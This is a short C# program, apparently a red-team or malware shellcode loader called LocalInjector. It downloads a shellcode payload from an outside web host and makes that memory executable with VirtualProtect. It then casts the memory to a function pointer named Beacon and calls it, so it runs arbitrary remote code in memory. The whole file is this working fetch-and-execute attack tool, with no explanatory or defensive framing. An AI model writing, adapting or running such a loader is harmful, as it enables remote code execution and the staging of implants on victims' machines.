using System;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace LocalInjector
{
    internal class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void Beacon();

        [DllImport("kernel32.dll")]
        static extern unsafe bool VirtualProtect(
            byte* lpAddress,
            uint dwSize,
            MEMORY_PROTECTION flNewProtect,
            out MEMORY_PROTECTION lpflOldProtect);

        enum MEMORY_PROTECTION : uint
        {
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_READWRITE = 0x04
        }

        static async Task Main(string[] args)
        {
            byte[] shellcode;
            using (var client = new HttpClient())
            {
                client.BaseAddress = new Uri("https://www.infinity-bank.com");
                shellcode = await client.GetByteArrayAsync("/shellcode/p/bhttp");
            }

            unsafe
            {
                fixed (byte* ptr = shellcode)
                {
                    VirtualProtect(
                        ptr,
                        (uint)shellcode.Length,
                        MEMORY_PROTECTION.PAGE_EXECUTE_READWRITE,
                        out _);

                    var beacon = Marshal.GetDelegateForFunctionPointer<Beacon>((IntPtr)ptr);
                    beacon();
                }
            }
        }
    }
}